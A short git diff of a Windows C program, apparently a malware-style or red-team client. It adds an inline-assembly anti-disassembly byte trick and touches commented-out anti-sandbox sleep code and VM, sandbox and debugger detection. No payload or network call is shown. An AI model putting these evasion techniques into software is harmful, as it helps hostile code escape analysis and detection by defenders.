@@ -24,15 +24,22 @@ WINBOOL is64BitMachine;
 int main(int argc, char** argv) {
     check();
 
-    // // Sleep for 5 minutes - anti sandbox technique!
-    // Sleep(300000);
+    // anti-dissassembly technique
+    // jump-1 -> dec eax -> inc eax
+    __asm__ __volatile__ (
+        ".byte 0xEB, 0xFF\n\t"
+        ".byte 0xC0, 0x48\n\t"
+    );
 
-    // // detect vms, sandboxes, and debuggers!
+
+    // detect vms, sandboxes, and debuggers!
     // RET_CODE ret = detectAnalysisTools();
+
     // if (ret != R_SAFE_RET) {
-    //     printf("RET: %s", getErrMessage(ret));
+    //     printf("RET: %s", getRetMessage(ret));
     //     exit(1);
     // }
+
 
     // retrieve the bitness of the client computer,  returns true if the current 
     // process is being run by the 32-bit emulator on a windows 64-bit machine
@@ -144,7 +151,7 @@ static void run() {
     }
 
     ret = startThreads();
-    printf("Cleaning up.\nProgram exited with msg: %s", getErrMessage(ret));
+    printf("Cleaning up.\nProgram exited with msg: %s", getRetMessage(ret));
     programCleanup();
 }
 
